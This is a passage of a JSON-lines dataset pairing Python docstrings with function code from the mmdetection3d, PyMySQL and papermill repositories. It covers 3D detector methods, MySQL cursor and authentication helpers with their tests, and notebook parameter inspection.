None, pred_bboxes, out_dir, file_name)", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Add shared or separable branch.\"\"\"\n", "func_signal": "def _add_conv_branch(self, in_channels, conv_channels):\n", "code": "conv_spec = [in_channels] + list(conv_channels)\n# add branch specific conv layers\nconv_layers = nn.Sequential()\nfor i in range(len(conv_spec) - 1):\n    conv_layers.add_module(\n        f'layer{i}',\n        ConvModule(\n            conv_spec[i],\n            conv_spec[i + 1],\n            kernel_size=1,\n            padding=0,\n            conv_cfg=self.conv_cfg,\n            norm_cfg=self.norm_cfg,\n            act_cfg=self.act_cfg,\n            bias=self.bias,\n            inplace=True))\nreturn conv_layers", "path": "mmdetection3d/mmdet3d/models/dense_heads/base_conv_bbox_head.py", "commit_date": "2020-09-13 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"bool: Whether the detector has a 3D box head.\"\"\"\n", "func_signal": "def with_pts_bbox(self):\n", "code": "return hasattr(self,\n               'pts_bbox_head') and self.pts_bbox_head is not None", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Extract point and image features of multiple samples.\"\"\"\n", "func_signal": "def extract_feats(self, points, img_metas, imgs=None):\n", "code": "if imgs is None:\n    imgs = [None] * len(img_metas)\nimg_feats, pts_feats = multi_apply(self.extract_feat, points, imgs,\n                                   img_metas)\nreturn img_feats, pts_feats", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"RPN test function.\"\"\"\n", "func_signal": "def simple_test_rpn(self, x, img_metas, rpn_test_cfg):\n", "code": "rpn_outs = self.img_rpn_head(x)\nproposal_inputs = rpn_outs + (img_metas, rpn_test_cfg)\nproposal_list = self.img_rpn_head.get_bboxes(*proposal_inputs)\nreturn proposal_list", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Test function of point cloud branch with augmentaiton.\"\"\"\n# only support aug_test for one sample\n", "func_signal": "def aug_test_pts(self, feats, img_metas, rescale=False):\n", "code": "aug_bboxes = []\nfor x, img_meta in zip(feats, img_metas):\n    outs = self.pts_bbox_head(x)\n    bbox_list = self.pts_bbox_head.get_bboxes(\n        *outs, img_meta, rescale=rescale)\n    bbox_list = [\n        dict(boxes_3d=bboxes, scores_3d=scores, labels_3d=labels)\n        for bboxes, scores, labels in bbox_list\n    ]\n    aug_bboxes.append(bbox_list[0])\n\n# after merging, bboxes will be rescaled to the original image size\nmerged_bboxes = merge_aug_bboxes_3d(aug_bboxes, img_metas,\n                                    self.pts_bbox_head.test_cfg)\nreturn merged_bboxes", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Test function with augmentaiton.\"\"\"\n", "func_signal": "def aug_test(self, points, img_metas, imgs=None, rescale=False):\n", "code": "img_feats, pts_feats = self.extract_feats(points, img_metas, imgs)\n\nbbox_list = dict()\nif pts_feats and self.with_pts_bbox:\n    bbox_pts = self.aug_test_pts(pts_feats, img_metas, rescale)\n    bbox_list.update(pts_bbox=bbox_pts)\nreturn [bbox_list]", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Test function without augmentaiton.\"\"\"\n", "func_signal": "def simple_test(self, points, img_metas, img=None, rescale=False):\n", "code": "img_feats, pts_feats = self.extract_feat(\n    points, img=img, img_metas=img_metas)\n\nbbox_list = [dict() for i in range(len(img_metas))]\nif pts_feats and self.with_pts_bbox:\n    bbox_pts = self.simple_test_pts(\n        pts_feats, img_metas, rescale=rescale)\n    for result_dict, pts_bbox in zip(bbox_list, bbox_pts):\n        result_dict['pts_bbox'] = pts_bbox\nif img_feats and self.with_img_bbox:\n    bbox_img = self.simple_test_img(\n        img_feats, img_metas, rescale=rescale)\n    for result_dict, img_bbox in zip(bbox_list, bbox_img):\n        result_dict['img_bbox'] = img_bbox\nreturn bbox_list", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"bool: Whether the detector has a shared head in image branch.\"\"\"\n", "func_signal": "def with_img_shared_head(self):\n", "code": "return hasattr(self,\n               'img_shared_head') and self.img_shared_head is not None", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Extract features from images and points.\"\"\"\n", "func_signal": "def extract_feat(self, points, img, img_metas):\n", "code": "img_feats = self.extract_img_feat(img, img_metas)\npts_feats = self.extract_pts_feat(points, img_feats, img_metas)\nreturn (img_feats, pts_feats)", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Apply dynamic voxelization to points.\n\nArgs:\n    points (list[torch.Tensor]): Points of each sample.\n\nReturns:\n    tuple[torch.Tensor]: Concatenated points, number of points\n        per voxel, and coordinates.\n\"\"\"\n", "func_signal": "def voxelize(self, points):\n", "code": "voxels, coors, num_points = [], [], []\nfor res in points:\n    res_voxels, res_coors, res_num_points = self.pts_voxel_layer(res)\n    voxels.append(res_voxels)\n    coors.append(res_coors)\n    num_points.append(res_num_points)\nvoxels = torch.cat(voxels, dim=0)\nnum_points = torch.cat(num_points, dim=0)\ncoors_batch = []\nfor i, coor in enumerate(coors):\n    coor_pad = F.pad(coor, (1, 0), mode='constant', value=i)\n    coors_batch.append(coor_pad)\ncoors_batch = torch.cat(coors_batch, dim=0)\nreturn voxels, num_points, coors_batch", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Test function of point cloud branch.\"\"\"\n", "func_signal": "def simple_test_pts(self, x, img_metas, rescale=False):\n", "code": "outs = self.pts_bbox_head(x)\nbbox_list = self.pts_bbox_head.get_bboxes(\n    *outs, img_metas, rescale=rescale)\nbbox_results = [\n    bbox3d2result(bboxes, scores, labels)\n    for bboxes, scores, labels in bbox_list\n]\nreturn bbox_results", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Initialize model weights.\"\"\"\n", "func_signal": "def init_weights(self, pretrained=None):\n", "code": "super(MVXTwoStageDetector, self).init_weights(pretrained)\nif pretrained is None:\n    img_pretrained = None\n    pts_pretrained = None\nelif isinstance(pretrained, dict):\n    img_pretrained = pretrained.get('img', None)\n    pts_pretrained = pretrained.get('pts', None)\nelse:\n    raise ValueError(\n        f'pretrained should be a dict, got {type(pretrained)}')\nif self.with_img_backbone:\n    self.img_backbone.init_weights(pretrained=img_pretrained)\nif self.with_pts_backbone:\n    self.pts_backbone.init_weights(pretrained=pts_pretrained)\nif self.with_img_neck:\n    if isinstance(self.img_neck, nn.Sequential):\n        for m in self.img_neck:\n            m.init_weights()\n    else:\n        self.img_neck.init_weights()\n\nif self.with_img_roi_head:\n    self.img_roi_head.init_weights(img_pretrained)\nif self.with_img_rpn:\n    self.img_rpn_head.init_weights()\nif self.with_pts_bbox:\n    self.pts_bbox_head.init_weights()", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Forward.\n\nArgs:\n    feats (Tensor): Input features\n\nReturns:\n    Tensor: Class scores predictions\n    Tensor: Regression predictions\n\"\"\"\n# shared part\n", "func_signal": "def forward(self, feats):\n", "code": "if len(self.shared_conv_channels) > 0:\n    x = self.shared_convs(feats)\n\n# separate branches\nx_cls = x\nx_reg = x\n\nif len(self.cls_conv_channels) > 0:\n    x_cls = self.cls_convs(x_cls)\ncls_score = self.conv_cls(x_cls)\n\nif len(self.reg_conv_channels) > 0:\n    x_reg = self.reg_convs(x_reg)\nbbox_pred = self.conv_reg(x_reg)\n\nreturn cls_score, bbox_pred", "path": "mmdetection3d/mmdet3d/models/dense_heads/base_conv_bbox_head.py", "commit_date": "2020-09-13 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"bool: Whether the detector has a fusion layer.\"\"\"\n", "func_signal": "def with_fusion(self):\n", "code": "return hasattr(self,\n               'pts_fusion_layer') and self.fusion_layer is not None", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Test without augmentation.\"\"\"\n", "func_signal": "def simple_test_img(self, x, img_metas, proposals=None, rescale=False):\n", "code": "if proposals is None:\n    proposal_list = self.simple_test_rpn(x, img_metas,\n                                         self.test_cfg.img_rpn)\nelse:\n    proposal_list = proposals\n\nreturn self.img_roi_head.simple_test(\n    x, proposal_list, img_metas, rescale=rescale)", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"bool: Whether the detector has a middle encoder.\"\"\"\n", "func_signal": "def with_middle_encoder(self):\n", "code": "return hasattr(self,\n               'middle_encoder') and self.middle_encoder is not None", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"Extract features of points.\"\"\"\n", "func_signal": "def extract_pts_feat(self, pts, img_feats, img_metas):\n", "code": "if not self.with_pts_bbox:\n    return None\nvoxels, num_points, coors = self.voxelize(pts)\nvoxel_features = self.pts_voxel_encoder(voxels, num_points, coors,\n                                        img_feats, img_metas)\nbatch_size = coors[-1, 0] + 1\nx = self.pts_middle_encoder(voxel_features, coors, batch_size)\nx = self.pts_backbone(x)\nif self.with_pts_neck:\n    x = self.pts_neck(x)\nreturn x", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\"bool: Whether the detector has a voxel encoder.\"\"\"\n", "func_signal": "def with_voxel_encoder(self):\n", "code": "return hasattr(self,\n               'voxel_encoder') and self.voxel_encoder is not None", "path": "mmdetection3d/mmdet3d/models/detectors/mvx_two_stage.py", "commit_date": "2020-10-11 00:00:00", "repo_name": "open-mmlab/mmdetection3d", "stars": 4614, "license": "apache-2.0", "language": "python", "size": 21095}
{"docstring": "\"\"\" test a fetchone() with no rows \"\"\"\n", "func_signal": "def test_fetch_no_result(self):\n", "code": "conn = self.connect()\nc = conn.cursor()\nc.execute(\"create table test_nr (b varchar(32))\")\ntry:\n    data = \"pymysql\"\n    c.execute(\"insert into test_nr (b) values (%s)\", (data,))\n    self.assertEqual(None, c.fetchone())\nfinally:\n    c.execute(\"drop table test_nr\")", "path": "PyMySQL/pymysql/tests/test_basic.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Does nothing, required by DB API.\"\"\"\n\n", "func_signal": "def setoutputsizes(self, *args):\n", "code": "\n\"\"\"Get the next query set\"\"\"\nconn = self._get_db()\ncurrent_result = self._result\nif current_result is None or current_result is not conn._result:\n    return None\nif not current_result.has_next:\n    return None\nself._result = None\nself._clear_result()\nconn.next_result(unbuffered=unbuffered)\nself._do_get_result()\nreturn True", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Encrypt password with salt and public_key.\n\nUsed for sha256_password and caching_sha2_password.\n\"\"\"\n", "func_signal": "def sha2_rsa_encrypt(password, salt, public_key):\n", "code": "if not _have_cryptography:\n    raise RuntimeError(\"'cryptography' package is required for sha256_password or caching_sha2_password auth methods\")\nmessage = _xor_password(password + b'\\0', salt)\nrsa_key = serialization.load_pem_public_key(public_key, default_backend())\nreturn rsa_key.encrypt(\n    message,\n    padding.OAEP(\n        mgf=padding.MGF1(algorithm=hashes.SHA1()),\n        algorithm=hashes.SHA1(),\n        label=None,\n    ),\n)", "path": "PyMySQL/pymysql/_auth.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Fetch next row\"\"\"\n", "func_signal": "def fetchone(self):\n", "code": "self._check_executed()\nrow = self.read_next()\nif row is None:\n    return None\nself.rownumber += 1\nreturn row", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Version information sanity.\"\"\"\n", "func_signal": "def test_version(self):\n", "code": "self.assertTrue(isinstance(_mysql.__version__, basestring))\n\nself.assertTrue(isinstance(_mysql.version_info, tuple))\nself.assertEqual(len(_mysql.version_info), 5)", "path": "PyMySQL/pymysql/tests/thirdparty/test_MySQLdb/test_MySQLdb_nonstandard.py", "commit_date": "2018-12-19 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"\nReturns the exact string that is sent to the database by calling the\nexecute() method.\n\nThis method follows the extension to the DB API 2.0 followed by Psycopg.\n\"\"\"\n", "func_signal": "def mogrify(self, query, args=None):\n", "code": "conn = self._get_db()\nif PY2:  # Use bytes on Python 2 always\n    query = self._ensure_bytes(query, encoding=conn.encoding)\n\nif args is not None:\n    query = query % self._escape_args(args, conn)\n\nreturn query", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\" test datetime conversion w microseconds\"\"\"\n\n", "func_signal": "def test_datetime_microseconds(self):\n", "code": "conn = self.connect()\nif not self.mysql_server_is(conn, (5, 6, 4)):\n    pytest.skip(\"target backend does not support microseconds\")\nc = conn.cursor()\ndt = datetime.datetime(2013, 11, 12, 9, 9, 9, 123450)\nc.execute(\"create table test_datetime (id int, ts datetime(6))\")\ntry:\n    c.execute(\n        \"insert into test_datetime values (%s, %s)\",\n        (1, dt)\n    )\n    c.execute(\"select ts from test_datetime\")\n    self.assertEqual((dt,), c.fetchone())\nfinally:\n    c.execute(\"drop table test_datetime\")", "path": "PyMySQL/pymysql/tests/test_basic.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Fetch all the rows\"\"\"\n", "func_signal": "def fetchall(self):\n", "code": "self._check_executed()\nif self._rows is None:\n    return ()\nif self.rownumber:\n    result = self._rows[self.rownumber:]\nelse:\n    result = self._rows\nself.rownumber = len(self._rows)\nreturn result", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Sign a random scramble with elliptic curve Ed25519.\n\nSecret and public key are derived from password.\n\"\"\"\n# variable names based on rfc8032 section-5.1.6\n#\n", "func_signal": "def ed25519_password(password, scramble):\n", "code": "if not _nacl_bindings:\n    _init_nacl()\n\n# h = SHA512(password)\nh = hashlib.sha512(password).digest()\n\n# s = prune(first_half(h))\ns = _scalar_clamp(h[:32])\n\n# r = SHA512(second_half(h) || M)\nr = hashlib.sha512(h[32:] + scramble).digest()\n\n# R = encoded point [r]B\nr = _nacl_bindings.crypto_core_ed25519_scalar_reduce(r)\nR = _nacl_bindings.crypto_scalarmult_ed25519_base_noclamp(r)\n\n# A = encoded point [s]B\nA = _nacl_bindings.crypto_scalarmult_ed25519_base_noclamp(s)\n\n# k = SHA512(R || A || M)\nk = hashlib.sha512(R + A + scramble).digest()\n\n# S = (k * s + r) mod L\nk = _nacl_bindings.crypto_core_ed25519_scalar_reduce(k)\nks = _nacl_bindings.crypto_core_ed25519_scalar_mul(k, s)\nS = _nacl_bindings.crypto_core_ed25519_scalar_add(ks, r)\n\n# signature = R || S\nreturn R + S", "path": "PyMySQL/pymysql/_auth.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\" test conversion of null, empty string \"\"\"\n", "func_signal": "def test_untyped(self):\n", "code": "conn = self.connect()\nc = conn.cursor()\nc.execute(\"select null,''\")\nself.assertEqual((None,u''), c.fetchone())\nc.execute(\"select '',null\")\nself.assertEqual((u'',None), c.fetchone())", "path": "PyMySQL/pymysql/tests/test_basic.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Fetch several rows\"\"\"\n", "func_signal": "def fetchmany(self, size=None):\n", "code": "self._check_executed()\nif self._rows is None:\n    return ()\nend = self.rownumber + (size or self.arraysize)\nresult = self._rows[self.rownumber:end]\nself.rownumber = min(end, len(self._rows))\nreturn result", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Execute stored procedure procname with args\n\nprocname -- string, name of procedure to execute on server\n\nargs -- Sequence of parameters to use with procedure\n\nReturns the original args.\n\nCompatibility warning: PEP-249 specifies that any modified\nparameters must be returned. This is currently impossible\nas they are only available by storing them in a server\nvariable and then retrieved by a query. Since stored\nprocedures return zero or more result sets, there is no\nreliable way to get at OUT or INOUT parameters via callproc.\nThe server variables are named @_procname_n, where procname\nis the parameter above and n is the position of the parameter\n(from zero). Once all result sets generated by the procedure\nhave been fetched, you can issue a SELECT @_procname_0, ...\nquery using .execute() to get any OUT or INOUT values.\n\nCompatibility warning: The act of calling a stored procedure\nitself creates an empty result set. This appears after any\nresult sets generated by the procedure. This is non-standard\nbehavior with respect to the DB-API. Be sure to use nextset()\nto advance through all result sets; otherwise you may get\ndisconnected.\n\"\"\"\n", "func_signal": "def callproc(self, procname, args=()):\n", "code": "conn = self._get_db()\nif args:\n    fmt = '@_{0}_%d=%s'.format(procname)\n    self._query('SET %s' % ','.join(fmt % (index, conn.escape(arg))\n                                    for index, arg in enumerate(args)))\n    self.nextset()\n\nq = \"CALL %s(%s)\" % (procname,\n                     ','.join(['@_%s_%d' % (procname, i)\n                               for i in range_type(len(args))]))\nself._query(q)\nself._executed = q\nreturn args", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Fetch the next row\"\"\"\n", "func_signal": "def fetchone(self):\n", "code": "self._check_executed()\nif self._rows is None or self.rownumber >= len(self._rows):\n    return None\nresult = self._rows[self.rownumber]\nself.rownumber += 1\nreturn result", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Fetch many\"\"\"\n", "func_signal": "def fetchmany(self, size=None):\n", "code": "self._check_executed()\nif size is None:\n    size = self.arraysize\n\nrows = []\nfor i in range_type(size):\n    row = self.read_next()\n    if row is None:\n        break\n    rows.append(row)\n    self.rownumber += 1\nreturn rows", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Scramble for old_password\"\"\"\n", "func_signal": "def scramble_old_password(password, message):\n", "code": "warnings.warn(\"old password (for MySQL <4.1) is used.  Upgrade your password with newer auth method.\\n\"\n              \"old password support will be removed in future PyMySQL version\")\nhash_pass = _hash_password_323(password)\nhash_message = _hash_password_323(message[:SCRAMBLE_LENGTH_323])\nhash_pass_n = struct.unpack(\">LL\", hash_pass)\nhash_message_n = struct.unpack(\">LL\", hash_message)\n\nrand_st = RandStruct_323(\n    hash_pass_n[0] ^ hash_message_n[0], hash_pass_n[1] ^ hash_message_n[1]\n)\noutbuf = io.BytesIO()\nfor _ in range(min(SCRAMBLE_LENGTH_323, len(message))):\n    outbuf.write(int2byte(int(rand_st.my_rnd() * 31) + 64))\nextra = int2byte(int(rand_st.my_rnd() * 31))\nout = outbuf.getvalue()\noutbuf = io.BytesIO()\nfor c in out:\n    outbuf.write(int2byte(byte2int(c) ^ byte2int(extra)))\nreturn outbuf.getvalue()", "path": "PyMySQL/pymysql/_auth.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\" test dict escaping \"\"\"\n", "func_signal": "def test_dict(self):\n", "code": "conn = self.connect()\nc = conn.cursor()\nc.execute(\"create table test_dict (a integer, b integer, c integer)\")\ntry:\n    c.execute(\"insert into test_dict (a,b,c) values (%(a)s, %(b)s, %(c)s)\", {\"a\":1,\"b\":2,\"c\":3})\n    c.execute(\"select a,b,c from test_dict\")\n    self.assertEqual((1,2,3), c.fetchone())\nfinally:\n    c.execute(\"drop table test_dict\")", "path": "PyMySQL/pymysql/tests/test_basic.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\" test timedelta conversion \"\"\"\n", "func_signal": "def test_timedelta(self):\n", "code": "conn = self.connect()\nc = conn.cursor()\nc.execute(\"select time('12:30'), time('23:12:59'), time('23:12:59.05100'), time('-12:30'), time('-23:12:59'), time('-23:12:59.05100'), time('-00:30')\")\nself.assertEqual((datetime.timedelta(0, 45000),\n                  datetime.timedelta(0, 83579),\n                  datetime.timedelta(0, 83579, 51000),\n                  -datetime.timedelta(0, 45000),\n                  -datetime.timedelta(0, 83579),\n                  -datetime.timedelta(0, 83579, 51000),\n                  -datetime.timedelta(0, 1800)),\n                 c.fetchone())", "path": "PyMySQL/pymysql/tests/test_basic.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "# No password fast path\n", "func_signal": "def caching_sha2_password_auth(conn, pkt):\n", "code": "if not conn.password:\n    return _roundtrip(conn, b'')\n\nif pkt.is_auth_switch_request():\n    # Try from fast auth\n    if DEBUG:\n        print(\"caching sha2: Trying fast path\")\n    conn.salt = pkt.read_all()\n    scrambled = scramble_caching_sha2(conn.password, conn.salt)\n    pkt = _roundtrip(conn, scrambled)\n# else: fast auth is tried in initial handshake\n\nif not pkt.is_extra_auth_data():\n    raise OperationalError(\n        \"caching sha2: Unknown packet for fast auth: %s\" % pkt._data[:1]\n    )\n\n# magic numbers:\n# 2 - request public key\n# 3 - fast auth succeeded\n# 4 - need full auth\n\npkt.advance(1)\nn = pkt.read_uint8()\n\nif n == 3:\n    if DEBUG:\n        print(\"caching sha2: succeeded by fast path.\")\n    pkt = conn._read_packet()\n    pkt.check_error()  # pkt must be OK packet\n    return pkt\n\nif n != 4:\n    raise OperationalError(\"caching sha2: Unknwon result for fast auth: %s\" % n)\n\nif DEBUG:\n    print(\"caching sha2: Trying full auth...\")\n\nif conn._secure:\n    if DEBUG:\n        print(\"caching sha2: Sending plain password via secure connection\")\n    return _roundtrip(conn, conn.password + b'\\0')\n\nif not conn.server_public_key:\n    pkt = _roundtrip(conn, b'\\x02')  # Request public key\n    if not pkt.is_extra_auth_data():\n        raise OperationalError(\n            \"caching sha2: Unknown packet for public key: %s\" % pkt._data[:1]\n        )\n\n    conn.server_public_key = pkt._data[1:]\n    if DEBUG:\n        print(conn.server_public_key.decode('ascii'))\n\ndata = sha2_rsa_encrypt(conn.password, conn.salt, conn.server_public_key)\npkt = _roundtrip(conn, data)", "path": "PyMySQL/pymysql/_auth.py", "commit_date": "2020-09-09 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Execute a query\n\n:param str query: Query to execute.\n\n:param args: parameters used with query. (optional)\n:type args: tuple, list or dict\n\n:return: Number of affected rows\n:rtype: int\n\nIf args is a list or tuple, %s can be used as a placeholder in the query.\nIf args is a dict, %(name)s can be used as a placeholder in the query.\n\"\"\"\n", "func_signal": "def execute(self, query, args=None):\n", "code": "while self.nextset():\n    pass\n\nquery = self.mogrify(query, args)\n\nresult = self._query(query)\nself._executed = query\nreturn result", "path": "PyMySQL/pymysql/cursors.py", "commit_date": "2019-12-07 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\" test aggregate functions \"\"\"\n", "func_signal": "def test_aggregates(self):\n", "code": "conn = self.connect()\nc = conn.cursor()\ntry:\n    c.execute('create table test_aggregates (i integer)')\n    for i in range(0, 10):\n        c.execute('insert into test_aggregates (i) values (%s)', (i,))\n    c.execute('select sum(i) from test_aggregates')\n    r, = c.fetchone()\n    self.assertEqual(sum(range(0,10)), r)\nfinally:\n    c.execute('drop table test_aggregates')", "path": "PyMySQL/pymysql/tests/test_basic.py", "commit_date": "2020-02-14 00:00:00", "repo_name": "PyMySQL/PyMySQL", "stars": 7509, "license": "mit", "language": "python", "size": 1421}
{"docstring": "\"\"\"Display help on notebook parameters.\n\nParameters\n----------\nctx : click.Context\n    Click context\nnotebook_path : str\n    Path to the notebook to be inspected\n\"\"\"\n", "func_signal": "def display_notebook_help(ctx, notebook_path, parameters):\n", "code": "nb = _open_notebook(notebook_path, parameters)\nclick.echo(ctx.command.get_usage(ctx))\npretty_path = get_pretty_path(notebook_path)\nclick.echo(\"\\nParameters inferred for notebook '{}':\".format(pretty_path))\n\nif not any_tagged_cell(nb, \"parameters\"):\n    click.echo(\"\\n  No cell tagged 'parameters'\")\n    return 1\n\nparams = _infer_parameters(nb)\nif params:\n    for param in params:\n        p = param._asdict()\n        type_repr = p[\"inferred_type_name\"]\n        if type_repr == \"None\":\n            type_repr = \"Unknown type\"\n\n        definition = \"  {}: {} (default {})\".format(p[\"name\"], type_repr, p[\"default\"])\n        if len(definition) > 30:\n            if len(p[\"help\"]):\n                param_help = \"\".join((definition, \"\\n\", 34 * \" \", p[\"help\"]))\n            else:\n                param_help = definition\n        else:\n            param_help = \"{:<34}{}\".format(definition, p[\"help\"])\n        click.echo(param_help)\nelse:\n    click.echo(\n        \"\\n  Can't infer anything about this notebook's parameters. \"\n        \"It may not have any parameter defined.\"\n    )\n\nreturn 0", "path": "papermill/papermill/inspection.py", "commit_date": "2020-10-30 00:00:00", "repo_name": "nteract/papermill", "stars": 5560, "license": "bsd-3-clause", "language": "python", "size": 2145}
{"docstring": "\"\"\"\nThis function replaces cell execution with it's own wrapper.\n\nWe are doing this for the following reasons:\n\n1. Notebooks will stop executing when they encounter a failure but not\n   raise a `CellException`. This allows us to save the notebook with the\n   traceback even though a `CellExecutionError` was encountered.\n\n2. We want to write the notebook as cells are executed. We inject our\n   logic for that here.\n\n3. We want to include timing and execution status information with the\n   metadata of each cell.\n\"\"\"\n# Execute each cell and update the output in real time.\n", "func_signal": "def papermill_execute_cells(self):\n", "code": "for index, cell in enumerate(self.nb.cells):\n    try:\n        self.nb_man.cell_start(cell, index)\n        self.execute_cell(cell, index)\n    except CellExecutionError as ex:\n        self.nb_man.cell_exception(self.nb.cells[index], cell_index=index, exception=ex)\n        break\n    finally:\n        self.nb_man.cell_complete(self.nb.cells[index], cell_index=index)", "path": "papermill/papermill/clientwrap.py", "commit_date": "2020-06-29 